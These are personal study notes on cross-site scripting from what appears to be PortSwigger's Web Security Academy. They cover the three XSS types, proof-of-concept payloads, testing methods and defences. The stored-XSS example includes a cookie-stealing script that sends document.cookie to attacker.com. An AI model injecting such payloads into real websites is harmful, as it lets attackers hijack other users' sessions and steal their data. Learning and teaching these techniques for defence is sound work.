# Cross-Site Scripting (XSS)

**Platform:** PortSwigger Web Security Academy
**Topic:** Cross-Site Scripting (XSS)
**Date Started:** 2026

---

## What is XSS?

Cross-site scripting (XSS) is a web security vulnerability that allows
an attacker to inject malicious JavaScript into a website that then
executes in other users' browsers.

**Key impacts:**
- Bypass the same-origin policy (which normally keeps websites isolated)
- Impersonate or masquerade as victim users
- Carry out any action the victim user can perform
- Read any data the victim user can access
- Capture login credentials
- Deface websites
- Inject trojan functionality

**Simple explanation:**
- SQLi attacks the **database** (server-side)
- XSS attacks **other users** (client-side) by making the website
  serve malicious JavaScript to them

---

## How XSS Works

1. Attacker finds an input that gets reflected or stored on a webpage
2. Attacker injects malicious JavaScript into that input
3. Victim visits the page — their browser executes the malicious script
4. Script runs in victim's browser with full access to their session

---

## Three Types of XSS

### 1. Reflected XSS
- Malicious script comes from the **current HTTP request**
- Not stored anywhere — only affects users who click the malicious link
- Attacker crafts a URL containing the payload and tricks victim into
  clicking it

**Example:**
  Normal URL:
https://site.com/search?q=hello
Page shows: <p>You searched for: hello</p>
Malicious URL:
https://site.com/search?q=<script>alert(1)</script>
Page shows: <p>You searched for: <script>alert(1)</script></p>
The script executes in the victim's browser when they visit the URL.

---

### 2. Stored XSS (Persistent XSS)
- Malicious script is **stored in the database**
- Executes for every user who views the infected content
- More dangerous than reflected — no need to trick individual users
- Common locations: blog comments, usernames, chat messages,
  product reviews, contact forms

**Example:**
    Attacker submits comment:
    <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
    Every user who views that comment has their cookie stolen
---

### 3. DOM-based XSS
- Vulnerability exists in **client-side JavaScript** not server-side
- The server never sees the malicious payload
- JavaScript on the page reads from an untrusted source (URL, cookies)
  and writes it directly to the DOM unsafely

**Example:**
```javascript
// Vulnerable JavaScript on the page:
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;

// Attacker input:
<img src=1 onerror='alert(1)'>

// Results in:
You searched for: <img src=1 onerror='alert(1)'>
```
The `onerror` event fires because `src=1` fails to load → XSS executes.

---

## XSS Type Comparison

| Type | Where Payload Lives | Who Gets Affected | Persistence |
|---|---|---|---|
| Reflected | URL/HTTP request | Only users who click link | Temporary |
| Stored | Database | All users who view content | Permanent |
| DOM-based | Client-side JS | Users who visit crafted URL | Temporary |

---

## Proof of Concept (PoC) Payloads

The standard way to confirm XSS is to make an alert box appear:
```javascript
<script>alert(1)</script>
```

**Important Chrome note:**
From Chrome v92+ onwards, `alert()` is blocked in cross-origin iframes.
Use `print()` instead for affected labs:
```javascript
<script>print()</script>
```

---

## How to Find XSS Vulnerabilities

**Manual testing:**
1. Submit simple unique input (e.g. `xsstest123`) into every input field
2. Check every location where that input appears in the response
3. Test each location with XSS payloads to see if JavaScript executes
4. Identify the context (HTML, attribute, JavaScript) and craft
   appropriate payload

**For Reflected/Stored XSS:**
- Test every input field, URL parameter, and header
- Look for where your input appears in the HTML response
- Try basic `<script>alert(1)</script>` first

**For DOM-based XSS:**
- Use browser DevTools to search the DOM for your input
- Look for dangerous JavaScript sinks:
  - `innerHTML`
  - `document.write()`
  - `eval()`
  - `setTimeout()`

---

## Impact of XSS (Depends on Context)

| Application Type | Impact |
|---|---|
| Public info site (no login) | Minimal |
| Application with sensitive data | Serious |
| Application with admin users | Critical — full takeover possible |

---

## Defences Against XSS

**1. Filter input on arrival**
- Validate and sanitize all user input
- Use allowlists of permitted characters/values
- Reject or clean anything that doesn't match expected input

**2. Encode output**
- HTML encode all user-controlled data before displaying it
- `<` becomes `&lt;`, `>` becomes `&gt;` etc
- Different encoding needed for different contexts:
  - HTML context → HTML encoding
  - JavaScript context → JavaScript Unicode escapes
  - URL context → URL encoding

**3. Content Security Policy (CSP)**
- Browser mechanism that restricts which scripts can execute
- Defines trusted sources for scripts, images, styles etc
- Acts as a last line of defence — reduces impact if XSS occurs
- Can often be bypassed — not a complete solution alone

**4. Use appropriate response headers**
- `Content-Type` — tells browser how to interpret the response
- `X-Content-Type-Options: nosniff` — prevents MIME type sniffing

---

## Common Questions

**XSS vs SQLi:**
- XSS = client-side, targets other users' browsers
- SQLi = server-side, targets the application's database

**XSS vs CSRF:**
- XSS = website returns malicious JavaScript to users
- CSRF = tricks a victim into performing unwanted actions

**How common is XSS?**
- XSS is probably the most frequently occurring web vulnerability
- Found in a huge percentage of web applications

---

## Key Terms

| Term | Meaning |
|---|---|
| XSS | Cross-Site Scripting |
| PoC | Proof of Concept — confirming a vulnerability exists |
| DOM | Document Object Model — the browser's representation of a page |
| Sink | A dangerous JavaScript function that can execute attacker input |
| Source | Where attacker-controlled data enters the JavaScript |
| CSP | Content Security Policy |
| Same-origin policy | Browser rule keeping websites isolated from each other |
